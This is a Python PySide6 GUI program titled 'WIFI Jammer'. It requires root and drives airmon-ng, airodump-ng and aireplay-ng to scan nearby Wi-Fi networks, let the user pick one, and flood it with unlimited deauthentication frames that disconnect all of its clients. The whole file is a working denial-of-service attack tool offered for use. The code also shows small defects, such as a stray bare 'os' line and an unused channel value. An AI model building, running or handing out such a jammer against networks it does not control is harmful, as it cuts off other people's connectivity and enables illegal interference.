import subprocess
import os
import sys  
import csv
from time import sleep
from PySide6.QtWidgets import QApplication, QMainWindow
from ui import Ui_MainWindow


class Jammer(QMainWindow):
    def __init__(self):
        super().__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.setWindowTitle("WIFI Jammer")

        #chek if the user is root
        if not os.geteuid() == 0 :
            print  ("Run it as root")
            sys.exit(1)

        # Connect the buttons to the functions
        self.ui.start_dump_but.clicked.connect(self.start_dump)
        self.ui.jam_but.clicked.connect(self.jam)
        self.ui.stop_but.clicked.connect(self.stop)
        self.ui.scan_interface_but.clicked.connect(self.scan_interfaces)
        self.ui.start_monitor_but.clicked.connect(self.start_monitor)
        self.ui.stop_dump_but.clicked.connect(self.stop_dump)
        self.ui.manage_mode_but.clicked.connect(self.revert_managed_mode)
        self.ui.jam_but.setEnabled(False)
        self.ui.stop_but.setEnabled(False)
        self.ui.stop_dump_but.setEnabled(False)
        self.ui.start_dump_but.setEnabled(False)
        self.ui.start_monitor_but.setEnabled(False)
        self.ui.manage_mode_but.setEnabled(False)

    def scan_interfaces(self):
        result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Process the output to get the interface names
        self.interface_names = []
        for line in result.stdout.splitlines():
    
            if 'IEEE 802.11' in line:
                self.interface_names.append(line.split()[0])     

        # Print the interface names
        for name in self.interface_names:
            print(name)
            self.ui.interface_combo.addItem(name)
        self.ui.scan_interface_but.setEnabled(False)
        self.ui.start_monitor_but.setEnabled(True)

    def start_monitor(self):
        
        self.current_interface = self.ui.interface_combo.currentText()
        self.wireless_interface_mon = self.current_interface + "mon"
        subprocess.run(['airmon-ng','start',self.current_interface],stdout=subprocess.PIPE,text=True)
        sleep(0.5)
        print(self.current_interface)
        self.ui.start_monitor_but.setEnabled(False)
        self.ui.manage_mode_but.setEnabled(True)
        self.ui.start_dump_but.setEnabled(True)

    def retrive_info(self, index):
        self.essid = []
        self.bssid = []
        self.channel = []
        with open("dump-01.csv", mode='r') as file:
            reader = csv.reader(file)
            for row in reader:
                # Check if the row contains the ESSID field
                if len(row) > 13:
                    var = row[index]  # Column where ESSIDs are stored
                    # Skip empty fields
                    if index == 0:
                        if var.strip():
                            self.bssid.append(var)
                    elif index == 3:
                        if var.strip():
                            self.channel.append(var)
                    elif index == 13:
                        if var.strip():
                            self.essid.append(var)
                            self.ui.comboBox_2.addItem(var)
       


    def start_dump(self):
        os



        #process = subprocess.Popen(['airodump-ng','-w','dump','--output-format','csv', self.wireless_interface_mon])
        self.process = subprocess.Popen(
        ['airodump-ng', '--output-format', 'csv', '--write', 'dump', self.wireless_interface_mon])   
       
        self.ui.start_dump_but.setEnabled(False)
        self.ui.stop_dump_but.setEnabled(True)

 
    
    def stop_dump(self):

        subprocess.run(['pkill', 'airodump-ng'])

        self.retrive_info(13)
        self.ui.jam_but.setEnabled(True)
        self.ui.stop_but.setEnabled(True)

    def revert_managed_mode(self):
        subprocess.run(['airmon-ng','stop',self.wireless_interface_mon],stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        sleep(1)
        subprocess.run(['systemctl','restart','NetworkManager'])
        sleep(1)
        
    def jam(self):

        current_essid = self.ui.comboBox_2.currentText()
        current_essid_index = self.ui.comboBox_2.currentIndex()
        self.retrive_info(0)
        current_bssid = self.bssid[current_essid_index]
        self.retrive_info(3)
        current_channel = self.channel[current_essid_index]

        self.process = subprocess.Popen(['aireplay-ng', self.wireless_interface_mon, '--deauth', '0', '-a', current_bssid])
   
   
    def stop(self):
        self.process.terminate()
        subprocess.run(['pkill', 'aireplay-ng'])

if __name__ == "__main__":
    app = QApplication([])
    window = Jammer()
    window.show()
    app.exec()
        
